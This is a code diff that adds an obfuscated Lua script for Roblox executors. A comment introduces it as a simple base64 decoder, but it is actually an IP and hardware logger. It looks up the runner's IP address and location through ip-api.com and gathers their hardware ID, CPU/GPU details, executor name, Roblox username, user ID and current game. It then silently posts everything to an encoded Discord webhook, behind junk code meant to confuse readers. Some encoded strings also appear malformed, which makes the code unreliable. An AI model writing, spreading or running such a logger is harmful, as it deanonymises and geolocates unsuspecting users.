@@ -1,0 +1,112 @@
+-- Base64 decoder (simple)
+local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local function d(s)
+ local r=""
+ local p=0
+ local c=0
+ local n=0
+ for i=1,#s do
+  local x=b:find(s:sub(i,i),1,true)-1
+  c=(c<<6)+x
+  n=n+6
+  if n>=8 then
+   n=n-8
+   r=r..string.char((c>>n)&0xFF)
+  end
+ end
+ return r
+end
+
+local g=game
+local h=g:GetService(d("SHR0cFNlcnZpY2U=")) -- "HttpService"
+local i=g:GetService(d("UGxheWVycw==")) -- "Players"
+local j=i.LocalPlayer
+
+local k=d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5Njk2OTI2NTg3NzIyNTYxNC9PakM0NAppsU253bk5iVEthVkc0NHI=") -- WEBHOOK_URL
+
+local l=http_request or syn.request or request or fluxus.request or krnl_http_request
+local function m()
+ local n={ip=d("VW5rbm93bg=="),city=d("VW5rb3du"),region=d("VW5rbm93bg=="),country=d("VW5rbm93bg=="),zip=d("VW5rb3du"),lat="0",lon="0",org=d("VW5rbm93bg=="),isp=d("VW5rb3du")}
+ if l then
+  local o,p=pcall(function()
+   return l({Url=d("aHR0cDovL2lwLWFwaS5jb20vanNvbg=="),Method=d("R0VU")})
+  end)
+  if o and p and p.Body then
+   local q=h:JSONDecode(p.Body)
+   if q.status==d("c3VjY2Vzcw==") then
+    n.ip=q.query or n.ip
+    n.city=q.city or n.city
+    n.region=q.regionName or n.region
+    n.country=q.country or n.country
+    n.zip=q.zip or n.zip
+    n.lat=tostring(q.lat)
+    n.lon=tostring(q.lon)
+    n.org=q.org or n.org
+    n.isp=q.isp or n.isp
+   end
+  end
+ end
+ return n
+end
+
+local function r()
+ local s=d("VW5hdmFpbGFibGU=")
+ pcall(function()
+  s=(syn and syn.gethwid and syn.gethwid()) or (krnl_get_hwid and krnl_get_hwid()) or (get_hwid and get_hwid()) or d("VW5rbm93bg==")
+ end)
+ return s
+end
+
+local function t()
+ local u={CPU=d("VW5hdmFpbGFibGU="),GPU=d("VW5hdmFpbGFibGU=")}
+ pcall(function()
+  local v=(getpcinfo and getpcinfo()) or (get_hardware_id and get_hardware_id())
+  if v then u.CPU=v.CPU or d("VW5rbm93bg==") u.GPU=v.GPU or d("VW5rbm93bg==") end
+ end)
+ return u
+end
+
+local function w()
+ local x=m()
+ local y=r()
+ local z=t()
+ local A=(identifyexecutor or function()return d("VW5rbm93bg==")end)()
+ local B=d("aHR0cHM6Ly93d3cucm9ibG94LmNvbS9oZWFkc2hvdC10aHVtYm5haWwvaW1hZ2U/dXNlcklkPQ==")..j.UserId..d("Jnd3aWR0aD00MjAmbmV4dD00MjAmbmVmb3JtPXBuZw==")
+ local C=string.format(d("aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzP3E9JXMmcz0lMw=="),x.lat,x.lon)
+ local D={
+  title=d("8J+QoyBTb2xhY2UgTG9nZ2VyIFRyaWdnZXJlZA=="),
+  color=tonumber(d("MHg3Mjg5REE=")),
+  fields={
+   {name=d("8J+MiCBVc2Vy"),value=string.format("`%s` (%d)",j.Name,j.UserId),inline=false},
+   {name=d("8J+MiCwgRXhlY3V0b3I="),value=A,inline=true},
+   {name=d("8J+QiCBCV0SUyB"),value="`"..y.."`",inline=false},
+   {name=d("8J+QiSDilLjwn5OQ"),value=z.CPU,inline=true},
+   {name=d("8J+QiS7ilLwn5OQ"),value=z.GPU,inline=true},
+   {name=d("8J+RiCBJUCc="),value="`"..x.ip.."`",inline=false},
+   {name=d("8J+QiCBCb2NhdGlvbg=="),value=string.format("%s, %s %s (%s)",x.city,x.region,x.zip,x.country),inline=false},
+   {name=d("8J+QiCwgTWFwcw=="),value="[View in Google Maps]("..C..")",inline=true},
+   {name=d("8J+RiCBJUFMIC8gT3Jn"),value=x.isp.." / "..x.org,inline=false},
+   {name=d("8J+RiCBDYW1l"),value=g.Name.." ("..g.PlaceId..")",inline=true},
+   {name=d("8J+RiCBUaW1l"),value=os.date(d("JXktJW0tJWQgJXo6JWk6JXM=")),inline=false}
+  },
+  thumbnail={url=B},
+  footer={text=d("U29sYWNlIFYyIExvZ2dlcg==")}
+ }
+ local E={username=d("U29sYWNlIExvZ2dlcg=="),embeds={D}}
+ pcall(function()
+  l({Url=k,Method=d("UE9TVA=="),Headers={[d("Q29udGVudC1UeXBl")]=d("YXBwbGljYXRpb24vanNvbg==")},Body=h:JSONEncode(E)})
+ end)
+end
+
+-- Junk code to confuse
+local function junk()
+ for i=1,5 do
+  local junk_var = i*math.random()
+  if junk_var > 10 then
+   junk_var = junk_var / 2
+  end
+ end
+end
+junk()
+
+w()
